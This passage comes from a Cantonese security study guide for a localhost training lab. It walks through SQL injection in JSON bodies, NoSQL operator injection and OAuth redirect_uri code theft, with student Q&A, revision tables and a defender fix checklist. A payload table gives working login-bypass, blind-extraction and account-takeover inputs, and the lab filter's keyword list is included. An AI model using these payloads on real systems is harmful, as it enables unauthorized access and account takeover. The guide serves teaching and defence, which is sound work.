
**Step 2：正常 query 攞 baseline**
- 做乜：Repeater 送 `POST /api/lookup.php` body `{"role":"user"}`。
- 喺邊度睇：回應記錄數。
- 預期結果：**五筆** role = user。
- 分辨：數到 5 就係你嘅 baseline 數字。

**Step 3：wildcard 擴大結果集**
- 做乜：body 改 `{"role":"*"}`。
- 喺邊度睇：回應記錄數。
- 預期結果：**六筆**（含 admin 同隱藏 service account）。
- 分辨：6 > 5 就係注入訊號。

**Step 4：operator payload**
- 做乜：body 改 `{"role":{"$ne":"nonexistent"}}`。
- 喺邊度睇：回應記錄數。
- 預期結果：同樣**六筆**。
- 分辨：同 wildcard 一樣嘅六筆，證明 operator 被當成查詢邏輯。

**Step 5（延伸驗證）**：登入場景試 `{"username":"admin", "password":{"$ne":""}}`。
- 預期結果：對每筆記錄都為真 → 毋須密碼登入。
- 分辨：若成功登入，即係後端冇對 `password` 做 type casting。

### 5.3 §13 OAuth / SSO Misconfiguration — 走一次完整攻擊鏈

**Step 1：走一次正常 SSO 流程**
- 做乜：`/login.php` 撳「Login with Government SSO」，喺 provider 以 `admin` / `123qwe!@#` 登入。
- 喺邊度睇：網址欄 + 落返 relying party 嘅頁面。
- 預期結果：見到「Welcome back」flash，以 admin 登入。
- 分辨：若 redirect 死循環，檢查 cookie／session。

**Step 2：Burp 捕捉 authorize request**
- 做乜：HTTP history 揀 `GET /oauth_provider.php?action=authorize&...`，send to Repeater。
- 喺邊度睇：Repeater 睇參數。
- 預期結果：`client_id=gov_lab`、`response_type=code`、`redirect_uri=http://localhost:8080/oauth.php?action=callback`、隨機 `state`。
- 分辨：多次登入 `state` 值唔同 = 正確行為。

**Step 3：起攻擊者 callback server**
- 做乜：`mkdir -p /tmp/attacker`、寫 `callback.php`、`php -S 127.0.0.1:9099 -t /tmp/attacker`。
- 喺邊度睇：新終端。
- 預期結果：PHP dev server 起喺 9099。
- 分辨：`Address already in use` 即 port 9099 被佔，換 port 並同步改 `redirect_uri`。

**Step 4：改 redirect_uri 偷 code**
- 做乜：Repeater 只改 `redirect_uri` 成 `http://localhost:9099/callback.php`，Send。
- 喺邊度睇：回應 header `Location`。
- 預期結果：**HTTP 302**，`Location` 指向攻擊者 server、帶新 valid code + state。
- 分辨：若回應係錯誤而唔係 302，即 provider 有驗證 redirect_uri。

**Step 5：Follow redirect 截取 code**
- 做乜：Repeater 回應右鍵 → Follow redirection（或複製 Location 開新 tab）。
- 喺邊度睇：攻擊者 callback page / `callback.log`。
- 預期結果：截到 `code` 同 `state`。
- 分辨：`code=(none)` 即 redirect 冇帶 code。

**Step 6：force-login**
- 做乜：先去 `/oauth.php?action=start` 攞新鮮 state，再開 `http://localhost:8080/oauth.php?action=callback&code=<STOLEN_CODE>&state=<FRESH_STATE>`。
- 喺邊度睇：redirect 去 `/index.php`。
- 預期結果：以 provider 認證嗰個使用者身分登入。
- 分辨：見「Invalid state parameter」即你貼咗舊 state（需用 action=start 後嘅新 state）。

**Step 7：驗證接管**
- 做乜：開 `/profile.php`。
- 喺邊度睇：頁面顯示嘅使用者。
- 預期結果：顯示 `admin`。
- 分辨：顯示 `admin` 但你從未輸入 admin 密碼 = 成功接管。

---

## 🧩 6. 新手補充：零經驗專用講解

> ⚠️ 教材外補充：本節全部內容係為零實戰經驗學生補嘅，**唔屬原文**。原文假設你已識 Kali + Burp + HTTP 基礎。

### 6.1 為何 SQL 注入漏洞會存在（日常比喻）

想像資料庫係一個超聽話嘅助理。你同佢講嘅嘢，佢**唔會分辨邊句係「你嘅資料」、邊句係「你嘅指令」** —— 你講咩佢就做咩。正常情況你只係喺「姓名」欄填一個名；但如果你填嘅係「名 + 一句新指令」，助理就照做。程式設計師嘅責任係**用工具（prepared statement）強制助理只准執行『樣板指令』、你填嘅嘢永遠只當資料**。冇用呢個工具、而係「縫合字串」（`"...username = '$username'..."`），就等於叫助理「照我填嘅字面執行」，於是就 inject 到。

### 6.2 為何 JSON body 一樣可以注入（打破「格式安全」迷思）

好多開發者嘅謬誤：「我唔用傳統表單，我用 JSON API，所以安全啲。」**錯。** 決定安唔安全嘅**唔係傳輸格式（JSON／XML／form／header／cookie）**，而係「**呢個值最後有冇被當成代碼執行**」。同一句毒藥，你放喺信封、email、定係便利貼，都一樣有毒。原文用咗一句好精警嘅講法：**the transport format is irrelevant（傳輸格式無關）**。

### 6.3 為何 blind injection 要一位一位估

因為呢個端點**唔會直接顯示資料畀你睇**，亦**唔會顯示錯誤訊息**，佢淨係回「成功」或「失敗」——呢個係**每條問題一個 bit（係／否）** 嘅資訊通道。你冇辦法一句問「成個密碼係咩」，但你可以問「第一個字元係唔係 `1`？」、「係唔係 `2`？」……每個字元問一串、逐個字元過。好似玩「二十問」遊戲：每個問題只准答是／否，你就用一連串問題逼近答案。佢**慢，但喺嚴格 filter 之下係最靜、最穩**嘅方法（亦係原文叫人自寫 Python 而唔用 sqlmap 嘅原因）。

### 6.4 `substr()` 子查詢運作拆解（視覺化）

```
substr( (SELECT password FROM users WHERE username='admin'), 1, 1 )
        └────────── 子查詢：攞 admin 嗰行嘅 password ──────────┘  ↑  ↑
                                                       開始位置  長度
```
- 開始位置 = 1、長度 = 1 → 攞第 1 個字元。
- 內層 loop 走晒 charset，搵到 match 就 `result += c`、`break`。
- 外層 loop 把開始位置 1 → 2 → 3 → …… 直到一整 round 冇 match（代表字串完）。

### 6.5 新手最常撞嘅 5 個卡點同解決方法

> ⚠️ 教材外補充：以下係零經驗學生實作時最常撞嘅問題。

1. **Burp 收唔到 request**：檢查 Firefox 有冇裝 FoxyProxy、proxy 設定有冇指向 Burp（通常 `127.0.0.1:8080`）、Burp Proxy 係唔係 intercept on。若喺 `localhost` 時 Firefox 會**繞過系統代理**，記得喺 Firefox 設定排除 `localhost` 或用 FoxyProxy 強制。
2. **HTTPS／CA 憑證未 import**：`localhost` 通常係 HTTP 唔使 CA，但一旦轉 HTTPS 就會見證書錯誤。要 import Burp 嘅 CA 憑證落瀏覽器／系統信任庫（§0 Setup 有做就唔使擔心）。
3. **payload 編碼問題（引號／空格）**：JSON 入面嘅單引號唔需要 escape，但**雙引號要** `\"`；空格喺 URL 要 `%20`、tab 係 `%09`。如果 send 完回應唔合理，先檢查有冇被自動 URL-encode 或者 JSON 壞咗。
4. **`Content-Type` 冇設或設錯**：本 lab 個 JSON code path **只有**當 `Content-Type: application/json` 才走。漏咗就等於去咗另一條路徑，點 inject 都冇用。
5. **引號數目唔平衡**：blind 版本嘅 `OR '1'='1` 結尾**故意唔封最後個引號**，等程式自己收尾。如果你自己加咗收尾引號，反而變成語法錯。數清楚你 payload 入面有幾個 `'`。

### 6.6 點樣判別自己成功定失敗

- **§4 經典注入**：見到 `"status":"ok"` + `Set-Cookie` + 入到 `/admin.php` 見到綠色 flag = 成功。
- **§4 blind**：逐位輸出直到 `Extracted password:`，再**用抽到嘅密碼真係登入到** = 成功（呢步最重要，因為佢證明你漏到嘅係真資料）。
- **§12**：`{"role":"*"}` 或 `{"role":{"$ne":"nonexistent"}}` 回嘅記錄數**多過** baseline（6 > 5）= 成功。
- **§13**：用**偷到嘅 code + 新鮮 state**成功登入，而且 `/profile.php` 顯示 `admin` **但你從冇入過 admin 密碼** = 成功。

### 6.7 NoSQL operator 點解會「靜靜咁」變成邏輯

關鍵係一個語言設計細節：**JSON 值可以係字串，亦可以係物件**。當後端寫 `$data['password']` 就放入 query，如果送嚟嘅係字串 `"123"`，佢就係資料；但如果送嚟嘅係物件 `{"$ne":""}`，而後端冇檢查型別，個物件就會**被 MongoDB 解讀成 operator**。防禦就係**強制型別**：如果 password 「一定要係字串」，個物件就會被拒。

### 6.8 OAuth 攻擊嘅心智模型：偷「一次性地圖」而唔係偷密碼

你要記住 §13 嘅**核心一句**：攻擊者偷嘅**唔係密碼**，而係一張「**已經通過認證嘅一次性通行證（code）**」。受害人身份係真嘅、code 係真嘅、唯一出問題嘅係 **provider 肯把張通行證送去一個冇登記過嘅地址（攻擊者 callback）**。所以只要 provider 有做好三件事——(1) 只送 code 去登記咗嘅 exact redirect_uri、(2) 每次 callback 都要 state 對得上、(3) token endpoint 要認證 client——呢條路就閂咗。

### 6.9 為何「偷到 code 仲要配新鮮 state」

`state` 係 relying party 用嚟做 **CSRF 防禦** 嘅：佢登入開始嗰時喺你 session 度種一個隨機值，callback 返嚟時要求對得上。你偷到嘅 code 係連同**受害人嗰次登入嘅舊 state** 一齊偷到嘅。但你要 force-login **你自己嘅瀏覽器 session**，而你自己 session 冇嗰個舊 state —— 所以你要先去 `action=start` 攞一個**屬於你自己 session 嘅新鮮 state**，再用「偷到嘅 code + 你自己嘅新 state」拼埋一齊。原文就係咁強調「**the stolen state belongs to the earlier authorize request and will be rejected**」。

### 6.10 三個 section 嘅「同一條主線」

無論係 SQLi、NoSQLi 定 OAuth，根本問題都係**「信任邊界放錯位」**：
- §4／§12：程式信任「使用者輸入只係資料」。
- §13：程式信任「callback 一定嚟自自己登記嘅位址」。
三條路都係**初始存取** —— 目的都係攞到一個你唔應該有嘅身分。呢個就係點解佢哋會被歸為同一階段。

---

## 💬 7. Student questions 詳解

本節列出本檔三個 section 嘅全部原文 student questions（英文原樣、標原題號），逐條附建議答案與「常見錯答」。

### 7.1 §4 SQL Injection in a JSON Object（原文 p.65）

**Q4-1.** Developers sometimes believe accepting JSON instead of form-encoded data protects them from injection. Trace exactly how a single quote inside a JSON string value still breaks out of a concatenated SQL query.

> ⚠️ 教材外補充（答案）：
> **English key points**：JSON is only a *transport format*; the danger is server-side. The server reads the raw body, `json_decode`s it, then concatenates the decoded value into a SQL string: `"... WHERE username = '$username' AND password = '$password' LIMIT 1"`. A payload value like `admin' OR '1'='1` closes the application's opening quote early, so everything after it is parsed by the database as SQL syntax, not data. The query becomes `... username = 'admin' OR '1'='1' AND password = 'x' LIMIT 1`, and `username = 'admin'` alone is true, so the row is returned regardless of the password.
> **繁中拆解**：重點係「JSON 只係包裝紙，唔係消毒劑」。危險發生喺伺服器端「decode 完就串接入 SQL 字串」嗰一刻；單引號 `'` 提早收掉程式本身嘅字串邊界，之後嘅字元就由資料升格為語法。考官要聽嘅係「**transport format irrelevant，value 被 concatenate 先係關鍵**」。
> **常見錯答**：以為「JSON 有 parser 所以會 escape 個單引號」—— 錯，`json_decode` 只係還原字串值，唔會把 `'` escape 成 SQL 安全形式。

**Q4-2.** Why does the input format — form fields, JSON, or XML — never by itself fix SQL injection? Explain what actually determines whether an application is vulnerable.

> ⚠️ 教材外補充（答案）：
> **English key points**：The input format says nothing about *how* the value is used. Vulnerability is determined by whether untrusted input is concatenated into a query (code) versus passed as a bound parameter (data). A prepared statement neutralizes injection whether the client sends JSON, XML or form data, because the query template and the values are sent to the database separately. Conversely, concatenation makes every format injectable.
> **繁中拆解**：決定安唔安全嘅係「**輸入最終有冇被當成代碼**」。用 prepared statement，咩格式都安全；用字串串接，咩格式都中招。格式係無關變數。
> **常見錯答**：「XML 一定比 form 安全」／「用咗 API 就一定冇 SQLi」—— 兩者都係把包裝紙當成防禦。

**Q4-3.** Explain how prepared statements with bound parameters neutralize SQL injection at the database layer, and why manual escaping or keyword deny-lists are inferior substitutes.

> ⚠️ 教材外補充（答案）：
> **English key points**：With prepared statements the SQL *structure* is fixed and sent to the database first; the user values are bound afterwards and the database treats them strictly as data, so a value can never be re-interpreted as SQL syntax. Manual escaping is error-prone (encoding quirks, numeric contexts, charset issues) and deny-lists (e.g. blocking `UNION`/`;`/`--`/`/*`) are trivially bypassable by changing syntax — the lab's own filter fell to boolean-based blind extraction. Deny-lists reduce attack surface but never guarantee safety.
> **繁中拆解**：prepared statement 令「樣板」同「值」分開送達，資料庫保證值永遠係資料。手動 escape 易漏（numeric context、編碼）；黑名單更只係「減速壆」，改語法就繞到（本 lab 個 filter 就係例子）。
> **常見錯答**：「用 `addslashes()` 就夠」—— 唔係，正確做法係參數綁定。

**Q4-4.** Why do automated scanners such as sqlmap often fail against endpoints with custom bad-list filters, JSON bodies, and uniform 401 responses? Describe the boolean-based blind technique a skilled attacker uses instead and why it still works.

> ⚠️ 教材外補充（答案）：
> **English key points**：Four reasons — (1) the injection point is a JSON string value, not a URL param or form field, so sqlmap's default tests miss it; (2) the custom bad-list silently strips `UNION`, `;`, `--`, `/*`, so sqlmap's standard payloads arrive corrupted; (3) SQL errors are suppressed and both wrong-password and syntax-error return the same generic 401, so error-based detection sees a flat signal; (4) the boolean signal requires bespoke syntax (a trailing `OR '1'='1` that balances the app's closing quote, relying on AND binding tighter than OR). The skilled attacker instead sends two requests differing only in a true/false condition and reads the 200-vs-401 difference, leaking data one character at a time with `substr((SELECT ...),pos,1)`.
> **繁中拆解**：sqlmap 死因 = 注入點非標準 + filter 改寫 payload + 冇 error 訊號 + boolean 訊號要度身語法。人攻方法 = 每 request 問一條真／假問題，靠 200／401 逐位漏。**呢個方法仍然有效，因為 filter 封嘅係 keyword，而唔係「令資料庫評估一條語法有效嘅 query」呢件事本身。**
> **常見錯答**：「sqlmap 唔支援 JSON」—— 佢其實支援，但默認唔會揀到呢個位，亦要大量手動配置。

### 7.2 §12 NoSQL Injection（原文 p.131–132）

**Q12-1.** Compare SQL injection and NoSQL injection at the level of root cause: what single mistake do they share, and why does changing the database engine not fix it?

> ⚠️ 教材外補充（答案）：
> **English key points**：The shared mistake is that untrusted user input becomes *query logic* instead of a *data value* — the application fails to separate code from data. Swapping MySQL for MongoDB changes the syntax of the payload (`OR '1'='1` → `{"$ne":""}`) but not the flaw, because MongoDB query objects also accept injected operators when values are not type-cast. Only treating input as data (parameterized queries / ORM binding / type casting) fixes it.
> **繁中拆解**：同一個錯 = 「未受信任輸入變成查詢邏輯」。換資料庫只係換咗 payload 嘅**外形**，根因冇變：MongoDB 一樣會把 `{"$ne":""}` 當 operator。CWE-943 就係呢個「data query logic 未中和」。
> **常見錯答**：「NoSQL 冇 SQL 所以唔會被 inject」—— 呢個正係原文講嘅最常見誤解。

**Q12-2.** In a JSON-based NoSQL query API, how can attacker-supplied operators or wildcards inside a filter field change the result set? Give concrete payload shapes that return every record and explain why each works.

> ⚠️ 教材外補充（答案）：
> **English key points**：Payload shapes — (a) `{"role":"*"}`：a wildcard becomes a match-everything query（in the lab the `*` is rewritten to SQL `%` in a `LIKE`）; (b) `{"role":{"$ne":"nonexistent"}}`：`$ne` means "not equal to nonexistent", true for every real document; (c) `{"username":"admin","password":{"$ne":""}}`：logs in without the password because every record's password is non-empty. Each works because a value meant to be a string is interpreted as an operator object, so the filter matches all records instead of one.
> **繁中拆解**：三個 shape 分別用 wildcard、`$ne` operator、同「password 唔等於空」達到「全部 match」。核心：**字串位置畀咗物件 ⇒ 物件變成邏輯**。
> **常見錯答**：以為必須有資料庫連線 —— 唔係，攻擊者只控制 HTTP JSON body。

**Q12-3.** How do MongoDB's operator-based query documents change the shape of injection payloads compared with SQL, and which server-side defenses — type checking, key allow-listing, parameterized drivers — neutralize them?

> ⚠️ 教材外補充（答案）：
> **English key points**：SQL injection lives in a parsed text string and uses SQL tokens (`OR '1'='1`, `UNION`); NoSQL injection lives in a query object and uses keys (`$ne`, `$gt`, `$regex`, `$where`) or wildcards (`*`). Defenses: type-cast every value to its expected type (a password must be a string, never an object); allow-list the keys/operator names accepted; strip or reject fields beginning with `$`; and use parameterized driver/ORM methods that bind values as data.
> **繁中拆解**：payload 外形由「文字 token」變「物件 key」。防禦三招：**type checking**（物件拒收）、**key allow-listing**（淨准白名單 key，`$` 開頭一律拒）、**parameterized driver**（綁定成資料）。CWE-943、A03:2021。
> **常見錯答**：「把 `$` 過濾就夠」—— 過濾係輔助，正解係型別強制 + 白名單 + 參數化。

> ⚠️ 教材外補充（自擬練習題，非原文）：原文 §12 只有 3 條 student question，為咗補足練習量，另加以下一題。
> **Q12-4.** A lookup API returns a single document for `{"role":"auditor"}` but five documents for `{"role":"*"}`. Explain what this difference proves about the backend.

> ⚠️ 教材外補充（答案）：
> **English key points**：The larger result set proves the `*` was evaluated as query logic (a wildcard) rather than matched as a literal string; if it were treated as data, `{"role":"*"}` would return zero records (no role literally equals `*`). A bigger result set for an operator/wildcard payload versus a specific value is the signature of NoSQL injection.
> **繁中拆解**：如果 `*` 被當字面字串，應該回 **0 筆**；回 5 筆（多於 baseline）證明佢被當成 wildcard 邏輯。呢個就係原文嘅判斷準則（larger result set indicates injection）。
> **常見錯答**：「大結果集只係因為 `*` 係萬用字元」—— 重點係後端**點解**會把資料值當成萬用字元，即係冇做輸入處理。

### 7.3 §13 OAuth / SSO Misconfiguration（原文 p.142）

**Q13-1.** In OAuth 2.0, what is the redirect_uri allow-list supposed to guarantee, and how does an open redirect_uri on the provider convert a normal login flow into account takeover? Walk through the attack from the victim's click to the attacker's valid authorization code.

> ⚠️ 教材外補充（答案）：
> **English key points**：The allow-list guarantees the provider only sends authorization codes to URIs the client pre-registered (exact match). Without it, an attacker edits `redirect_uri` to their own callback; when the victim completes login at the provider, the provider redirects the browser — with a fresh valid code — to the attacker's server. The attacker reads the code from their callback (or log), then redeems it at the relying party to force-login as the victim. The victim never sees the attacker, and the attacker never sees the victim's credentials.
> **繁中拆解**：allow-list 嘅保證 = 「**code 只會送去登記咗嘅位址**」。冇咗 → 攻擊者改 `redirect_uri` 指去自己 server，受害人一登入，provider 就把**新鮮有效 code**送去攻擊者。攻擊者由 callback／log 攞到 code 再兌換即可接管。**關鍵：偷嘅係 code（通行證），唔係密碼。**（CWE-346）
> **常見錯答**：「要偷到受害人密碼先接管到」—— 唔使，code 本身就係 bearer credential。

**Q13-2.** Treat the authorization code as a bearer credential. Explain the threat model behind making codes single-use and short-lived, and what goes wrong when each protection is relaxed.

> ⚠️ 教材外補充（答案）：
> **English key points**：A code is a bearer credential — whoever holds it can redeem it, so it is valuable on its own. Single-use prevents replay: if a stolen/leaked code is redeemed twice, the second redemption should fail (and can signal theft). Short-lived limits the window during which a stolen code is still valid. Relax single-use → a code can be replayed indefinitely by anyone who captures it; relax short-lived → an exfiltrated code remains exploitable long after the fact.
> **繁中拆解**：code 係「**冇記名嘅通行證**」——誰拎到誰用到。一次性 → 防 replay；短命 → 縮短可行窗口。兩者任一放寬，都會令「偷到一次 = 可以長期／重複濫用」。
> **常見錯答**：「code 有加密所以安全」—— 佢係 bearer，唔係靠保密內容而係靠持有者即係合法者嘅假設，所以要靠時間同一次性限制。

**Q13-3.** What must a token endpoint validate before exchanging an authorization code for tokens? Cover client authentication and code binding (issued-to audience, expiry, one-time use), and the failure mode when each check is missing.

> ⚠️ 教材外補充（答案）：
> **English key points**：The token endpoint must (1) authenticate the client (`client_id`/`client_secret`, or PKCE for public clients); (2) verify the code was issued to *this* client/audience and to the same `redirect_uri`; (3) enforce the code's expiry; (4) enforce one-time use. Missing client authentication → anyone holding a stolen code can exchange it (the lab's exact flaw). Missing audience binding → a code issued for one client can be redeemed by another. Missing expiry/one-time → replay.
> **繁中拆解**：token endpoint 要驗四樣：**client 認證**、**code 綁定（發畀邊個 client／audience）**、**有效期**、**一次性**。本 lab 正正係缺「client 認證」→ 任何人偷到 code 都兌換到。缺 audience binding → 跨 client 兌換；缺 expiry／一次性 → replay。
> **常見錯答**：「code 短命就唔使認證 client」—— 兩者係獨立控制，缺一都有洞。

**Q13-4.** What role does the state parameter play as the CSRF defense of an OAuth flow? Explain the exact check the relying party performs and why an attacker must obtain a fresh, matching state value before redeeming a stolen code.

> ⚠️ 教材外補充（答案）：
> **English key points**：`state` is a per-session, cryptographically random value the relying party generates at flow start and stores in the user's session. On callback it compares the returned `state` against the session value and rejects the callback if they differ. This stops CSRF-style attacks where an attacker feeds their own code into a victim's session. Because the stolen `state` belongs to the earlier authorize request (not the attacker's current session), the attacker must first visit `action=start` to obtain a fresh state that matches their own session, then pair it with the stolen code.
> **繁中拆解**：`state` = 每 session 隨機值，登入開始時種入 session，callback 時**逐字比對**，唔對就拒。偷到嘅 `state` 屬於受害人嗰次登入，唔屬你嘅 session → 你要先 `action=start` 攞一個**屬於你自己 session 嘅新鮮 state**，配偷到嘅 code 才過關。呢個正係原文 Recap 講「the state check did its job」。
> **常見錯答**：「state 用嚟加密 code」—— 唔係，佢係 CSRF 防禦（正確性比對），唔負責保密。

---

## 🎒 8. 考前 5 分鐘懶人包 ＋ 自測

### 8.1 本檔必背關鍵數字同對應

| 項目 | 值 |
|---|---|
| §4 漏洞分類 | CWE-89（SQL command 特徵未中和）／OWASP A03:2021 — Injection |
| §4 OWASP 2021 數據 | 274,228 個受測應用、32,078 個 CVE、最高 incidence 19% |
| §4 In the wild 事件 | 2021 Accellion FTA（SQLi + OS command execution 部署 web shell） |
| §4 lab bad list | `['UNION', 'INSERT', 'DELETE', 'UPDATE', 'DROP', '--', ';', '/*']`（`str_ireplace()` case-insensitive） |
| §4 真／假訊號 | 真 = HTTP 200 + `{"status":"ok"}`；假 = HTTP 401 + `{"status":"error","message":"Invalid credentials"}` |
| §4 還原密碼 | `123qwe!@#`（9 個字元） |
| §4 成功 flag | `FLAG{HIDDEN_ADMIN_ENDPOINT_ESCALATION_SUCCESS}` |
| §12 漏洞分類 | CWE-943（data query logic 特徵未中和）／OWASP A03:2021 — Injection |
| §12 baseline vs 注入 | `{"role":"user"}` → 5 筆；`{"role":"*"}`／`{"$ne":"nonexistent"}` → 6 筆 |
| §13 漏洞分類 | CWE-346（Origin Validation Error）／OWASP A07:2021 + OWASP API2 — Broken Authentication |
| §13 lab provider | `http://localhost:8080/oauth_provider.php`；`client_id=gov_lab`、`response_type=code` |
| §13 callback | `redirect_uri=http://localhost:8080/oauth.php?action=callback` → 改去 `http://localhost:9099/callback.php` |
| §13 安全標準 | RFC 9700（exact redirect-URI matching、PKCE 全 client） |

### 8.2 Payload 對照表

| 用途 | Payload／值 | 備註 |
|---|---|---|
| 經典 tautology（JSON body） | `{"username":"admin' OR '1'='1","password":"x"}` | 靠 OR 優先次序 |
| 布林真條件 | `{"username":"admin' AND '1'='1' OR '1'='1","password":"x"}` | 回 200 |
| 布林假條件 | `{"username":"admin' AND '1'='2' OR '1'='1","password":"x"}` | 回 401 |
| Blind 子查詢（問一字元） | `admin' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='1' OR '1'='1` | 逐位掃 |
| NoSQL operator 繞登入 | `{"username":"admin", "password":{"$ne":""}}` | 對每筆為真 |
| NoSQL wildcard | `{"role":"*"}` | 全 match |
| NoSQL `$ne` | `{"role":{"$ne":"nonexistent"}}` | 全 match |
| OAuth 偷 code | 改 `redirect_uri` → `http://localhost:9099/callback.php` | provider 回 302 |
| OAuth force-login | `http://localhost:8080/oauth.php?action=callback&code=<STOLEN_CODE>&state=<FRESH_STATE>` | 需新鮮 state |

### 8.3 英文必背句

> **English Standard Definition:** SQL injection occurs when an application builds a database query by concatenating untrusted input directly into the SQL string.
> **English Standard Definition:** The transport format is irrelevant: JSON, XML, form data, headers, and cookies are all equally injectable if the value is concatenated into SQL.
> **English Standard Definition:** NoSQL injection is simply SQL injection translated into JSON: untrusted input becomes query logic instead of a data value.
> **English Standard Definition:** The provider must only redirect codes to registered URIs; the relevant weakness is CWE-346 (Origin Validation Error).
> **English Standard Definition:** A keyword bad-list is at best a speed bump.

### 8.4 5 條自測問題

1. 為何送 JSON 唔會令 SQL injection 消失？決定性因素係咩？（答：傳輸格式無關；決定性因素係值有冇被 concatenate 入 query，即 code/data 有冇分離。）
2. Blind SQLi 點解要靠 `OR '1'='1` 做尾部，而唔係 `--`？（答：lab 封咗 `--`；尾部要平衡應用程式嘅收尾引號，令 query 語法有效。）
3. NoSQL 攻擊者為何唔需要資料庫連線？（答：佢只控制 HTTP JSON body；漏洞喺後端把 decode 值直接放入 query object。）
4. OAuth 流程依賴邊三大控制？（答：exact redirect-uri matching、per-session random state、short-lived single-use codes exchanged server-to-server with client auth／PKCE。）
5. 為何偷到 code 仲要配一個新鮮 state？（答：偷到嘅 state 屬受害人嗰次登入，唔屬攻擊者 session；force-login 攻擊者瀏覽器 session 需要自己嘅新鮮 state，relying party 會對比 session 內嘅 state。）

**自測答案（最後一行）**：1) transport format irrelevant；root cause = untrusted input concatenated into query (code≠data separation). 2) `--` 喺 bad list；靠保持引號平衡。 3) 只控制 HTTP JSON body，未受信任值入 query object 變邏輯。 4) exact redirect-uri match + per-session random state + short-lived single-use server-to-server exchanged codes（client auth + PKCE）。 5) stolen state ≠ 攻擊者 session；需 `action=start` 攞新鮮匹配 state。

---

## 🛡️ 9. 防守方修正清單（Defender Fix Checklist）

### 9.1 §4 SQL Injection in a JSON Object

原文修正（p.65 照收）：
- **永遠唔好靠串接使用者輸入去砌 SQL** —— 用 **PDO prepared statements + bound parameters**，令每個值都停留喺「資料」身分、唔會變「代碼」。
- **把 JSON body 同表單欄位同等看待（同樣懷疑）**。
- **回籠統錯誤訊息**，唔好分辨「密碼錯」定「語法錯」。
- **對登入嘗試做 rate-limit**。
- 原文結論：**keyword bad-list 最多只係 speed bump**。

> ⚠️ 教材外補充（更完整修法）：
> - **PHP**：用 PDO／mysqli prepared statements，一律 `bindParam`／`execute([...])`，唔好用 `sprintf`、`.`、`"$var"` 串接。設定 `PDO::ATTR_EMULATE_PREPARES = false` 令真正用資料庫端準備語句。
> - **ASP.NET**：用 `SqlCommand` 配 `SqlParameter`（`cmd.Parameters.AddWithValue(...)`）；EF Core 用 LINQ／parameterized query，避免 `FromSqlRaw` 拼字串。
> - **輸入驗證**：對型別、長度、格式做白名單驗證（例如 username 只准 `[A-Za-z0-9_]`）。
> - **縱深防禦**：資料庫帳號用最小權限（只 SELECT 需要嘅表）、開 WAF 做輔助、記錄異常登入模式。
> - **記住**：黑名單、`addslashes()`、手動 escape 都係「次等替代」，唔可以當正解。

### 9.2 §12 NoSQL Injection

原文修正（p.129 照收）：
- **永遠唔好把 decode 咗嘅 JSON 直接放入 query filter**。
- **Type-cast 值**成預期型別。
- **拒絕物件同 operator key**（例如 `$ne`、`$gt`、`$where`）出現喺使用者輸入。
- 用 **parameterized queries 或 ORM 方法**把輸入綁定成資料。

> ⚠️ 教材外補充（更完整修法）：
> - **鍵白名單**：query filter 只接受預先定義嘅 key（例如 `username`、`password`、`role`），任何以 `$` 開頭或其他未知 key 一律拒。
> - **型別強制**：在 decode 之後、入 query 之前，明確把每個欄位 cast 成字串／數字（PHP 用 `(string)`、`filter_var`）。
> - **驅動層防護**：MongoDB driver／ODM（例如 Mongoose schema type `String`）會拒收對象值；用 schema validation。
> - **禁用危險 operator**：如非必要唔用 `$where`（可執行 JS）；限制 `$regex` 輸入長度以防 ReDoS。
> - **API 層**：對 lookup 類端點做 rate-limit 同結果集大小上限（避免一次拉晒全表）。
> - **ASP.NET**：用強型別 DTO（model binding）而唔係 `JObject` 直通，令物件值無法通過型別邊界。

### 9.3 §13 OAuth / SSO Misconfiguration

原文修正（p.134 照收）：
- **喺 provider 登記 redirect URI 並完全一致咁匹配**（冇 wildcard、冇 prefix matching）。
- **每個 callback 都要求並驗證一個每 session 隨機嘅 `state`**。
- **喺 token endpoint 用 `client_id` 同 `client_secret` 認證 client**。
- **保持 authorization code 短命同一次性**。
- **按 RFC 9700 要求所有 client 都用 PKCE**。

> ⚠️ 教材外補充（更完整修法）：
> - **避免 Implicit flow**（token 會暴露喺 URL fragment），改用 authorization code + PKCE。
> - **Authorization code 綁定**：發 code 時記住係發畀邊個 client／audience，兌換時核對；換完即失效（一次性）。
> - **state 必須密碼學隨機**（用 CSPRNG），唔好用可預測值；每次登入重生成。
> - **防 open redirect**：即使 provider 有 allow-list，relying party 自己嘅 callback 亦要做嚴格路徑匹配，避免次級 open redirect 被串連利用。
> - **ASP.NET / PHP 一般做法**：ASP.NET 用 `AddOpenIdConnect` 並設 `CallbackPath`、`ResponseType = code`、開 PKCE；PHP 用成熟 OAuth client library（唔好自己砌 flow），並喺 config 明確列 `redirect_uri` 白名單。
> - **監控**：對 token endpoint 失敗兌換、異常 redirect_uri 值做告警。

### 9.4 本檔三個漏洞 → 對應出口

| 漏洞 | 根因 | 首選修法 |
|---|---|---|
| §4 SQLi in JSON | 使用者輸入被 concatenate 入 SQL 字串 | Prepared statements + bound parameters |
| §12 NoSQLi | decode 值直接放入 query object，operator 可注入 | Type casting + key allow-listing + parameterized driver |
| §13 OAuth misconfig | 未驗證 redirect_uri + token endpoint 未認證 client | Exact redirect-uri match + state + client auth + PKCE（RFC 9700） |

➜ **對應速記：ART_Final_CheatSheet.md**
➜ 攻擊鏈②A（CAPTCHA／Email Bomb／Brute Force）見 `ART_T3_03_InitialAccess_A_CredentialAttacks_StudyGuide.md`
